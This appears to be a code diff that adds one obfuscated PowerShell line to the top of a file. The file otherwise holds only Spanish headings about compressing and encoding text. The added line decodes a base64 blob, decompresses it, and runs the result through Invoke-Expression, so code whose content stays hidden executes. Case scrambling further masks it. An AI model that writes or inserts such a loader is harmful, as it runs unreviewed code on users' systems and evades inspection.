@@ -1,3 +1,7 @@
+(nEw-OBJECt  Io.CoMpreSsion.DEflateSTrEaM( [SyStem.io.memoRYSTReaM][convErT]::fromBaSE64STriNg( 'eJyVVstqw0AQ/ZdKYbNBqN3aORieciCTiBgK5KFDWoZKRAJt4MWk3fW/O5CQhAUa3Rt77717JL8RPGeTbO7O3L6TRXMEat9mUOnGYoRMfsHHTBAYFaUqzhK5QmEAwTKivjEYwsPrR+TRcKzHZcAw9zMN5PU4GSHZLgsgAibL9Yo2EQXjC9l6mgdmAnDSEEE67tO6BX/NVoTGjQQzBoXQOZKDFHHShCg8CmHGwXZbB8wxTcfTtxht5JDFPp7VSyZLfhVExGQsV52U1aQNoDEmiFbE7bhhFNsCAei7WeVQjaKM+HgZhNrUinb0mguXHppvODq44bQyzFxTXDGZlvwNfBZwG9zo5Z50Rl3PoB8WfGhHdGyRQ6S+ot0/3+t4/cPh56MAydmC6ENmnVfMvoSduYpy5B9ew4GVpGg17U6tYwOZ5sUZKOnT26ebjv3D1eLVNHObaT+eTDwVVW5Stn8nxpSPJtRGg9CWvsa6nDZfCFc+17qENpt06cV+ELmCN24AdV66pkUer/Nk7lK') ,[SysTEM.io.COMpResSion.coMPRESSIONMoDE]::DeCompress ) | ForeacH{nEw-OBJECt Io.StReaMrEaDer( $_,[SySTEM.teXT.enCOdING]::aSciI )}).rEaDTOEnd( ) | InVoKE-expREssION
+
+
+
 # Stage 1
 
 # 1. Escribir el texto a comprimir y codificar
